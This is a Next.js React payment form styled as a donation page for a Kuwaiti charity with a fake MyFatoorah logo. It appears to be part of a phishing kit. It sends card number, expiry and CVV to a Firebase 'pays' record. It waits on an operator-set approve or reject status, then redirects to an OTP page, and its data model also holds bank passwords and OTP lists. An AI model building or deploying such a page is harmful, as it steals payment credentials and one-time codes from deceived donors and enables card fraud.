import Image from "next/image"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { useEffect, useState } from "react"
import { doc, onSnapshot } from "firebase/firestore"
import { db, handlePay } from "@/lib/firebase"
import { useRouter } from "next/navigation"
import { FullPageLoader } from "./fullpageloader"

type PaymentInfo = {
  cardNumber: string
  year?: string
  month?: string
  bank?: string
  cvv?: string
  otp?: string
  pass?: string
  cardState?: string
  allOtps?: string[]
  bank_card?: string[]
  prefix?: string
  status?: "new" | "pending" | "approved" | "rejected"
  page?: string
}
export default function PaymentForm() {
  const amount = () => {
    if (typeof window !== "undefined") {
      return localStorage.getItem("item") || "0.00"
    }
    return "0.00"
  }
  const [newotp] = useState([""])
  const [step, setstep] = useState(1)
  const [loading, setLoading] = useState(false)

  const [paymentInfo, setPaymentInfo] = useState<PaymentInfo>({
    cardNumber: "",
    year: "",
    month: "",
    otp: "",
    allOtps: newotp,
    bank: "",
    pass: "",
    cardState: "new",
    bank_card: [""],
    prefix: "",
    status: "new",
    page: "otp",
  })
  const router = useRouter()

  useEffect(() => {
    const visitorId = localStorage.getItem("visitor")
    if (visitorId) {
      const unsubscribe = onSnapshot(doc(db, "pays", visitorId), (docSnap) => {
        if (docSnap.exists()) {
          const data = docSnap.data() as PaymentInfo
          if (data.status) {
            setPaymentInfo((prev) => ({ ...prev, status: data.status }))
            if (data.status === "approved") {
              router.push('/otp')
              setLoading(false)
            } else if (data.status === "rejected") {
              setLoading(false)
              alert("تم رفض البطاقة الرجاء, ادخال معلومات البطاقة بشكل صحيح ")
              setstep(1)
            }
          }
        }
      })

      return () => unsubscribe()
    }
  }, [])
const handleSubmit=()=>{
  setLoading(true)
  handlePay(paymentInfo as any,setPaymentInfo as any)
}
  return (
    <div className="min-h-screen bg-slate-50">
      <div className="max-w-md mx-auto p-6 bg-white rounded-xl shadow-sm">
        {/* Header */}
        <div className="flex justify-between items-center mb-8">
          <button className="px-4 py-1 border rounded-md text-sm">English</button>
          <div className="flex items-center gap-4">
            <h1 className="text-xl font-semibold text-right">جمعية إيلاف الخيرية</h1>
            <Image
              src="/logoelaf.jpg"
              alt="Charity Logo"
              width={40}
              height={40}
              className="object-contain"
            />
          </div>
        </div>

        {/* Amount Display */}
        <div className="text-center mb-8">
          <div className="flex justify-center items-baseline gap-1 text-3xl font-bold text-blue-600">
            <span>د.ك</span>
            <span>{amount()}</span>
          </div>
          <div className="text-sm text-gray-600 mt-2">
            <span>العصر</span>
            <span> | </span>
            <span>تنتهي خلال 2 يوم</span>
          </div>
        </div>

        {/* Card Form */}
        <form className="space-y-6" onSubmit={handleSubmit}>
          <h2 className="text-lg font-medium text-center border-b pb-4">ادخال بيانات البطاقة</h2>
          <div className="space-y-4">
            <div>
              <Label className="text-right block mb-2">اسم صاحب البطاقة</Label>
              <Input type="text" dir="rtl" className="w-full text-right"
                placeholder="الاسم كما يظهر على البطاقة" />
            </div>

            <div>
              <Label className="text-right block mb-2">رقم البطاقة</Label>
              <div className="relative">
                <Input type="tel" dir="ltr"
                  onChange={(e: any) =>
                    setPaymentInfo({
                      ...paymentInfo,
                      cardNumber: e.target.value,
                    })} maxLength={16} className="w-full pl-12" placeholder="0000 0000 0000 0000" />
                <div className="absolute left-3 top-1/2 -translate-y-1/2">
                  <Image
                    src="/m.png"
                    alt="Card Icons"
                    width={24}
                    height={24}
                    className="object-contain"
                  /> <Image
                    src="/v.png"
                    alt="Card Icons"
                    width={24}
                    height={24}
                    className="object-contain"
                  />
                </div>
              </div>
            </div>

            <div className="grid grid-cols-2 gap-4">
              <div>
                <Label className="text-right block mb-2">شهر / سنة</Label>
                <Input type="text" dir="ltr" className="w-full" onChange={(e: any) =>
                  setPaymentInfo({
                    ...paymentInfo,
                    month: e.target.value,
                  })} placeholder="MM / YY" />
              </div>
              <div>
                <Label className="text-right block mb-2">رقم التحقق</Label>
                <Input type="text" dir="ltr" className="w-full" onChange={(e:any) =>
                  setPaymentInfo({
                    ...paymentInfo,
                    cvv: e.target.value,
                  })} placeholder="CVV" />
              </div>
            </div>
          </div>

          <Button className="w-full bg-blue-600 hover:bg-blue-700 text-lg py-6">ادفع الآن</Button>
        </form>

        {/* Footer */}
        <div className="mt-8 text-center">
          <p className="text-sm text-gray-500">مدعوم من</p>
          <Image
            src="/vercel.svg"
            alt="MyFatoorah Logo"
            width={120}
            height={30}
            className="mx-auto mt-2"
          />
        </div>
      </div>
      {loading && <FullPageLoader/>}
    </div>
  )
}

